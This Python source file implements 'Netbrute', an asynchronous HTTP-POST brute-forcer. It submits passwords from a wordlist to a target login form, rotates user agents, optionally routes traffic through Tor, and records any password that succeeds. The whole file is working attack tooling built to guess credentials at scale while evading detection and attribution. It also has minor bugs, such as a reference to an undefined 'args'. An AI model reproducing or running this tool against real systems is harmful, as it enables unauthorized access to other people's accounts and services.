import asyncio
import aiohttp
import random
import os
import time
import gzip
from netbruter.tor import get_tor_connector, parse_proxy_address
from netbruter.user_agent import get_user_agents
from copy import copy
# noinspection PyPackageRequirements
from progressbar import ProgressBar, Bar, Counter, Percentage, AdaptiveETA

try:
    from asyncio import JoinableQueue as Queue
except ImportError:
    from asyncio import Queue
    from asyncio import Event


class Netbrute:
    """
    HTTP-POST BruteForcer
    """
    def __init__(self, aiohttp_session, target_url, payload_model, wordlist, error_string, tasks, tor=None,
                 tor_address=None, debug=None):
        self.max_tasks = tasks
        self.queue = Queue()
        self.attack_url = target_url
        self.error_string = [x.strip() for x in error_string.split(',')]
        self.payload = self._generate_payload_type(payload_model)
        self.session = aiohttp_session
        self.wordlist = wordlist
        self.found = Event()
        self.tor_use = tor
        self.debug = debug
        self.runned_passwords = set()
        self.old_passwds = set()
        self.restore_files = []
        self.progress_bar = None
        self.ua = self._prepare_user_agents()
        self.start_time = time.time()
        self.last_report_time = time.time()

        # Statuses set of settings
        self.loaded_passwords = 0
        self.tried_passwords = 0
        self.error_passwords = 0
        self.max_passwords = 0

        # Tor set of settings
        if self.tor_use is not None and tor_address is not None:
            ip, port = parse_proxy_address(tor_address)
            self.tor_address = "http://{0}:{1}".format(ip, port)

        # Session set of settings
        self.session_name = self._generate_session_name()
        restore_files = self._search_open_sesssion()
        if restore_files > 0:
            for file in self.restore_files:
                if self._load_old_session(file) is True:
                    break
        else:
            pass

    @staticmethod
    def _prepare_user_agents():
        #  Load user agents
        ua = get_user_agents()
        if not ua:
            raise Exception("No user agents available")
        return ua

    def _load_old_session(self, fn):
        """
        Function to ask user input and decide to use or not to use restore files.
        This also decompress (if it can) and reads data, storing it inside the main object.
        :param fn: String => Filename
        :return: Boolean
        """

        question = input("\n[*] Do you want to load passwords from file '{0}'? [y/N] ".format(os.path.basename(fn)))

        if question.upper() == "Y":
            try:
                #  Decompress the data and store it raw
                with gzip.open(fn, "rb", compresslevel=9) as f:
                    _data = f.read()
                with open(fn, "wb") as f:
                    f.write(_data)
            except:
                #  If decompression fails, probably it is not compressed.
                #  So we will open it and read, as it should.
                with open(fn, "rb") as f:
                    _data = f.read()

            #  Read data from file, decode it from BinaryBuffer to String.
            lines = [x.decode() for x in _data.split(b"\n")]

            #  Finally, add each line to old_passwords set.
            for line in lines:
                if line != "":
                    self.old_passwds.add(line)

            #  Define the session name as the restore file used.
            self.session_name = os.path.basename(fn)
            return True
        else:
            return False

    def _search_open_sesssion(self):
        current_dir = os.getcwd() + os.sep
        for root, dirc, files in os.walk(current_dir):
            for f in files:
                if f.endswith(".restore"):
                    file_path = os.path.join(root, f)
                    self.restore_files.append(file_path)
        return len(self.restore_files)

    @staticmethod
    def _generate_session_name():
        _id = hex(random.randint(0, 999999))
        return "session_{0}.restore".format(_id[2:])

    @staticmethod
    def _generate_payload_type(user_input):
        """
        Function responsible for transforming String type into Dictionary type
        :param user_input: str
        :return: d: dict
        """
        d = dict()
        p = [x.strip() for x in user_input.split(",")]
        for element in p:
            key, value = element.split(":")
            d[key] = value
        return d

    @staticmethod
    def _encode_payload_www(unencoded_payload):
        """
        Function responsible for transforming a dictionary payload into x-www-form-urlencoded payload
        :param unencoded_payload:
        :return:
        """
        pl = str()
        dict_len = len(unencoded_payload)
        i = 1
        for key in unencoded_payload:
            if i != dict_len:
                pl += "{0}={1}&".format(key, unencoded_payload[key])
            else:
                pl += "{0}={1}".format(key, unencoded_payload[key])
            i += 1
        return pl

    def _adjust_payload(self, password):
        """
        Creates a copy from payload supplied by user, then formats it with attack data.
        :param password: String
        :return: tmp_payload: String
        """
        tmp_payload = copy(self.payload)
        for key in tmp_payload:
            value = tmp_payload[key]
            if value.upper() == "PASS":
                tmp_payload[key] = password
        return tmp_payload

    @staticmethod
    def _store_data(fn, data):
        """
        Stores buffer of data into a file and adds a new line at the end of it.
        :param fn: String => Filename for a file
        :param data: String => Data buffer
        :return: None
        """
        data += "\n"
        with open(fn, "a") as f:
            f.write(data)
        return

    def _increment_progress_bar(self):
        """
        Check if one second has passed since last report, then renewal the progress bar with current attack progress
        :return: None
        """
        if (time.time() - self.last_report_time) < 1:
            return
        self.last_report_time = time.time()
        self.progress_bar.update((self.max_passwords - self.loaded_passwords) + self.tried_passwords)

    def _parse_response(self, status, response_url, passwd):
        """
        Parses the response packet based on http status code andresponse URL
        :param status: Integer => HTTP status code
        :param response_url: String => Request URL response
        :param passwd: String => Password that originated this response
        :return: None
        """
        if status == 200:
            for error_string in self.error_string:
                if error_string in response_url:
                    self.tried_passwords += 1
                    self.runned_passwords.add(passwd)
                    if len(self.runned_passwords) % 100 == 0:
                        [self._store_data(self.session_name, x) for x in self.runned_passwords]
                        self.runned_passwords.clear()
                    return
            print("\n[+] Password was found: {0}".format(passwd))
            print("[*] Response URL: {0}".format(response_url))
            self._store_data("correct.pass", passwd)
            self.found.set()
        elif status != 200:
            self.error_passwords += 1
            print("[!] Incompatible status code: {0} | URL: {1}".format(status, response_url))
        return

    async def attack_this(self, password):
        """
        Perform IO operation for http request
        :param password: String => Password used in the attack
        :return: None
        """
        if self.debug:
            print("Started attack!")
        headers = {
            "content-type": "application/x-www-form-urlencoded",
            "User-Agent": random.choice(self.ua),
        }
        custom_payload = self._adjust_payload(password)
        # AsyncTimeout removed since commit c47781f
        #  with async_timeout.timeout(10):
        if self.tor_use is True:
            proxy_addr = self.tor_address
        else:
            proxy_addr = None
        async with self.session.post(self.attack_url, data=self._encode_payload_www(custom_payload),
                                     headers=headers, proxy=proxy_addr) as response:

            status, response_url = response.status, response.url

            self._parse_response(status, response_url, password)

            if self.debug is False:
                self._increment_progress_bar()

            if self.debug:
                print("Ended attack! [{0}] - Status: {1} - URL: {2}".format(password, status, response_url))
        return

    def _parse_wordlist(self, iterable):
        return list(filter(lambda x: x not in self.old_passwds, iterable))

    def _read_wordlist(self):
        tmp_list = []
        with open(self.wordlist, "r") as f:
            for line in f.readlines():
                tmp_list.append(line.replace("\n", ""))
        parsed_list = self._parse_wordlist(tmp_list)
        for element in parsed_list:
            self.queue.put_nowait(element)
        self.max_passwords = len(tmp_list)
        self.loaded_passwords = len(parsed_list)
        return len(parsed_list)

    @asyncio.coroutine
    def work(self):
        while not self.queue.empty():

            # Check if password is found and throw queue away
            if self.found.is_set():
                # noinspection PyProtectedMember
                for _ in range(len(self.queue._queue)):
                    yield from self.queue.get()

            #  Retrieve passwords from queue and test them
            password = yield from self.queue.get()
            yield from self.attack_this(password)
            self.queue.task_done()

    @asyncio.coroutine
    def initiate(self, loop):

        #  Attack preparation phase
        if self.debug:
            print("Started initiation!")
        pass_number = self._read_wordlist()
        print("\n[*] Program have read {0} passwords.\n".format(pass_number))

        #  Adjust session object and tor usage information
        if self.tor_use is True:
            print("[+] Using tor with address {0}\n".format(args.tor_address))
            conn = get_tor_connector(args.tor_address)
            self.session = aiohttp.ClientSession(loop=loop, connector=conn)
        else:
            self.session = aiohttp.ClientSession(loop=loop)

        #  Graphical visualization of attack status
        self.progress_bar = ProgressBar(widgets=
                                        ["Guesses: ", Counter(), "/", str(self.max_passwords),
                                         " [", Percentage(), "] ", Bar(marker="#"), " ", AdaptiveETA()],
                                        maxval=self.max_passwords).start()
        self.progress_bar.update(self.max_passwords - pass_number)

        #  Now the code to run the tasks and execute the async requests
        workers = [asyncio.Task(self.work()) for _ in range(self.max_tasks)]
        yield from self.queue.join()
        for w in workers:
            w.cancel()
        if self.debug:
            print("Ended initiation!")

